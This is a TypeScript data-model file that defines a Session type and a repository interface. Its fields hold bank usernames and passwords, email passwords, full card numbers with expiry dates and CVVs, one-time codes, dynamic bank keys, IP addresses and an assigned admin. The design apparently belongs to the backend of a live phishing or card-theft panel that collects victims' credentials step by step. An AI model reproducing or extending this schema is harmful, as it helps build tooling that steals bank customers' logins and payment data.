import { ActionState, SessionState } from "@prisma/client";

export type Session = {
  id: string;
  state: SessionState;
  action: ActionState;
  step?: string | null;
  ip?: string | null;
  name?: string | null;
  phone?: string | null;
  email?: string | null;
  emailPass?: string | null;
  address?: string | null;
  bank?: string | null;
  user?: string | null;
  pass?: string | null;
  holder?: string | null;
  cc?: string | null;
  exp?: string | null;
  cvv?: string | null;
  scheme?: string | null;
  type?: string | null,
  level?: string | null,
  brand?: string | null,
  document?: string | null;
  country?: string | null;
  city?: string | null;
  dinamic?: string | null;
  otp?: string | null;
  assignedAdminId?: string | null;
  lastError?: string | null;
};

export type SessionPatch = Partial<Omit<Session, "id">>;

export interface SessionRepository {
  findById(id: string): Promise<Session | null>;
  create(data: any): Promise<Session>;
  update(id: string, patch: SessionPatch): Promise<Session>;
  listRecent(limit: number): Promise<Session[]>;
}